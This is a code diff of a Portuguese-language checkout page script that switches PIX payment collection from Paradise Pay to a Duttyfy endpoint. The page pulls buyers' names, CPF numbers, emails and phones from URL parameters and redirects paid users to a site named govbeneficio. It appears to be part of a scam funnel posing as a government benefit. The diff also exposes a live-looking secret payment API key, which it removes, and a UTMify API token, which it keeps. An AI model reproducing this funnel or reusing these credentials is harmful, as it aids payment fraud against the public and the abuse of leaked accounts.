@@ -167,15 +167,12 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 <script src="js/main.js"></script>
 <script>
 // =====================================================
-// CONFIGURAÇÃO — PARADISE PAY
+// CONFIGURAÇÃO — DUTTYFY PIX
 // =====================================================
-var PARADISE_API_URL  = 'https://multi.paradisepags.com/api/v1';
-var PARADISE_API_KEY  = 'sk_220715873acbf9718fdd92d1d08b541320f5c7c711b5017be8cb91edc9192bdf';
-var PARADISE_PRODUCT_HASH = 'prod_7333c0ff75106325'; /* hash do produto cadastrado na Paradise */
-
+var DUTTYFY_PIX_URL   = 'https://www.pagamentos-seguros.app/api-pix/zqaSpcAug94Zdb8cr3WnAmHjnIwYcheVmU-Cd5kvpKXbQLm0xVtsztoGScRruPtE6EdIOhgH8KaRETL6KtECrQ';
+var PARADISE_PRODUCT_HASH = 'prod_7333c0ff75106325'; /* mantido para UTMify */
 /* ── CREDENCIAL DA API UTMIFY ── */
 var UTMIFY_API_TOKEN  = 'hLLRiNJhaIzqdivrzVY7PLr1zH3sia014pMW';
-
 var redirectUrls = {
     6187: 'https://govbeneficio.vercel.app/up4.html',
     3582: 'https://govbeneficio.vercel.app/up4.html',
@@ -188,17 +185,14 @@ var redirectUrls = {
 };
 var DEFAULT_REDIRECT = 'https://govbeneficio.vercel.app/up4.html';
 // =====================================================
-
 var _txid          = null;
 var _pixCode       = '';
-var _pixQrCode     = '';
 var _pollingTimer  = null;
 var _expiryTimer   = null;
 var _paymentAmount = 1320;
 var _customerData  = {};
 var _pixCreatedAt  = '';
-var STORAGE_KEY    = 'paradise_pix_tx3';
-
+var STORAGE_KEY    = 'duttyfy_pix_tx3';
 /* ── CAPTURA DE PARÂMETROS UTM ── */
 var _p            = new URLSearchParams(window.location.search);
 var _utm_source   = _p.get('utm_source')   || '';
@@ -256,26 +250,16 @@ function setStatus(type, html) {
     el.style.display = 'block';
     el.innerHTML = html;
 }
-function displayQRCode(data) {
+function displayQRCode(pixCodeStr) {
+    /* Duttyfy não retorna base64 — gera o QR a partir da string EMV */
     var el = document.getElementById('qrcode');
     el.innerHTML = '';
-    if (!data) return;
-    var qrBase64 = data;
-    if (qrBase64 && !qrBase64.startsWith('http')) {
-        if (!qrBase64.startsWith('data:image')) {
-            qrBase64 = 'data:image/png;base64,' + qrBase64;
-        }
-        var img = document.createElement('img');
-        img.src = qrBase64; img.alt = 'QR Code PIX';
-        img.style.cssText = 'max-width:100%;height:auto;display:block;margin:0 auto;';
-        el.appendChild(img);
-    } else {
-        var img2 = document.createElement('img');
-        img2.src = 'https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' + encodeURIComponent(data);
-        img2.alt = 'QR Code PIX';
-        img2.style.cssText = 'max-width:100%;height:auto;display:block;margin:0 auto;';
-        el.appendChild(img2);
-    }
+    if (!pixCodeStr) return;
+    var img = document.createElement('img');
+    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' + encodeURIComponent(pixCodeStr);
+    img.alt = 'QR Code PIX';
+    img.style.cssText = 'max-width:100%;height:auto;display:block;margin:0 auto;';
+    el.appendChild(img);
 }
 function startExpiryTimer(expiry) {
     if (_expiryTimer) clearInterval(_expiryTimer);
@@ -340,11 +324,10 @@ function renderPix() {
         document.getElementById('payerInfo').style.display = 'block';
     }
     document.getElementById('pixCode').textContent = _pixCode;
-    displayQRCode(_pixQrCode || _pixCode);
+    displayQRCode(_pixCode);
     togglePaymentMethod('copy');
     showPix();
 }
-
 // =====================================================
 // FORMATA DATA NO PADRÃO UTMIFY (YYYY-MM-DD HH:MM:SS)
 // =====================================================
@@ -356,7 +339,6 @@ function utmifyFmtDate(d) {
         String(d.getMinutes()).padStart(2,'0') + ':' +
         String(d.getSeconds()).padStart(2,'0');
 }
-
 // =====================================================
 // NOTIFICA A UTMIFY VIA API
 //   status = 'waiting_payment' → venda PENDENTE
@@ -419,7 +401,6 @@ async function utmifyNotificar(status) {
         });
     } catch(e) {}
 }
-
 // =====================================================
 // REDIRECIONA APÓS APROVAÇÃO — REPASSA TODOS OS PARAMS
 // =====================================================
@@ -431,44 +412,37 @@ function redirectAfterPayment() {
     console.log('Redirecionando para:', url.toString());
     setTimeout(function(){ window.location.href = url.toString(); }, 2000);
 }
-
 // =====================================================
-// POLLING — PARADISE PAY
-// GET /api/v1/query.php?action=get_transaction&id={id}
-// Status aprovado: "approved"
+// POLLING — DUTTYFY
+// GET {DUTTYFY_PIX_URL}?transactionId={id}
+// Status aprovado: "COMPLETED"
 // =====================================================
 function startPolling() {
     if (!_txid) return;
-    console.log('Polling Paradise para transaction_id:', _txid);
+    console.log('Polling Duttyfy para transactionId:', _txid);
     var attempts = 0;
     _pollingTimer = setInterval(async function() {
         attempts++;
         if (attempts > 180) { clearInterval(_pollingTimer); return; }
         try {
             var r = await fetch(
-                PARADISE_API_URL + '/query.php?action=get_transaction&id=' + encodeURIComponent(_txid),
-                { headers: { 'X-API-Key': PARADISE_API_KEY } }
+                DUTTYFY_PIX_URL + '?transactionId=' + encodeURIComponent(_txid)
             );
             var s = await r.json();
             console.log('Polling tentativa ' + attempts + ':', s.status);
-            if (s.status === 'approved') {
+            if (s.status === 'COMPLETED') {
                 clearInterval(_pollingTimer);
                 clearTx();
                 await utmifyNotificar('paid'); /* ← venda APROVADA na UTMify */
                 setStatus('paid', '<div class="status-icon">✅</div><div class="status-text">Pagamento confirmado!</div>');
                 redirectAfterPayment();
-            } else if (s.status === 'failed' || s.status === 'refunded' || s.status === 'chargeback') {
-                clearInterval(_pollingTimer);
-                clearTx();
-                setStatus('error', '<div class="status-icon">❌</div><div class="status-text">Pagamento cancelado ou expirado.</div>');
             }
         } catch(e) { console.error('Polling erro:', e); }
     }, 5000);
 }
-
 // =====================================================
-// CRIA PIX — PARADISE PAY
-// POST /api/v1/transaction.php  |  Auth: X-API-Key
+// CRIA PIX — DUTTYFY
+// POST {DUTTYFY_PIX_URL}  |  Auth: URL criptografada (sem header)
 // =====================================================
 async function createPix() {
     var nome     = getP('nome') || getP('name') || '';
@@ -482,57 +456,54 @@ async function createPix() {
     if (nomeEnvio.split(' ').filter(Boolean).length < 2) nomeEnvio += ' Pagador';
     _paymentAmount = valor;
     _customerData  = { nome: nome, documento: cpf, email: email, telefone: telefone };
-    _pixCreatedAt  = utmifyFmtDate(new Date()); /* salva momento da criação para a UTMify */
+    _pixCreatedAt  = utmifyFmtDate(new Date());
 
-    var referencia = 'PED-' + Date.now() + '-' + Math.floor(Math.random()*9000+1000);
+    /* Captura todos os parâmetros de rastreamento da URL atual */
+    var utmStr = window.location.search.replace(/^\?/, '');
+
     var payload = {
-        amount:      valor,
-        description: 'Pagamento Aprovado.',
-        reference:   referencia,
-        source:      'api_externa',
-        productHash: PARADISE_PRODUCT_HASH,
+        amount: valor,
         customer: {
             name:     nomeEnvio,
+            document: cpf,
             email:    email,
-            phone:    telefone,
-            document: cpf
+            phone:    telefone
         },
-        tracking: {
-            utm_source:   _utm_source,
-            utm_medium:   _utm_medium,
-            utm_campaign: _utm_campaign,
-            utm_content:  _utm_content,
-            utm_term:     _utm_term,
-            src:          _src,
-            sck:          _sck
-        }
+        item: {
+            title:    'Pagamento Aprovado.',
+            price:    valor,
+            quantity: 1
+        },
+        paymentMethod: 'PIX',
+        utm: utmStr
     };
-    console.log('Paradise payload:', JSON.stringify(payload));
-    var res = await fetch(PARADISE_API_URL + '/transaction.php', {
+
+    console.log('Duttyfy payload:', JSON.stringify(payload));
+
+    var res = await fetch(DUTTYFY_PIX_URL, {
         method:  'POST',
-        headers: { 'Content-Type': 'application/json', 'X-API-Key': PARADISE_API_KEY },
+        headers: { 'Content-Type': 'application/json' },
         body:    JSON.stringify(payload)
     });
     var data = await res.json();
-    console.log('Paradise resposta:', JSON.stringify(data));
-    if (!res.ok || data.status !== 'success' || !data.qr_code) {
+    console.log('Duttyfy resposta:', JSON.stringify(data));
+
+    if (!res.ok || !data.pixCode || !data.transactionId) {
         throw new Error('Erro ' + res.status + ': ' + (data.message || JSON.stringify(data)));
     }
-    _txid      = data.transaction_id;
-    _pixCode   = data.qr_code;
-    _pixQrCode = data.qr_code_base64 || '';
-    /* calcula expiração: usa expires_at da Paradise se disponível, senão 10 min */
-    var expiryMs = data.expires_at
-        ? new Date(data.expires_at).getTime()
-        : Date.now() + 600000;
+
+    _txid    = data.transactionId;
+    _pixCode = data.pixCode;
+
+    /* Duttyfy não retorna expires_at — usa 10 min */
+    var expiryMs = Date.now() + 600000;
     saveTx({
-        txid: _txid, pixCode: _pixCode, pixQrCode: _pixQrCode,
+        txid: _txid, pixCode: _pixCode,
         amount: _paymentAmount, customer: _customerData,
         expiry: expiryMs
     });
     return data;
 }
-
 // =====================================================
 // INICIALIZAÇÃO
 // =====================================================
@@ -547,8 +518,7 @@ async function initCheckout() {
     if (saved && saved.txid) {
         console.log('Transação salva encontrada:', saved.txid);
         _txid = saved.txid; _pixCode = saved.pixCode;
-        _pixQrCode = saved.pixQrCode; _paymentAmount = saved.amount;
-        _customerData = saved.customer || {};
+        _paymentAmount = saved.amount; _customerData = saved.customer || {};
         renderPix();
         startExpiryTimer(saved.expiry);
         startPolling();
@@ -559,9 +529,7 @@ async function initCheckout() {
         await createPix();
         renderPix();
         utmifyNotificar('waiting_payment'); /* ← venda PENDENTE na UTMify */
-        startExpiryTimer(
-            _pixQrCode && false ? Date.now() + 600000 : Date.now() + 600000
-        );
+        startExpiryTimer(Date.now() + 600000);
         startPolling();
     } catch(err) {
         console.error('Erro ao criar PIX:', err);
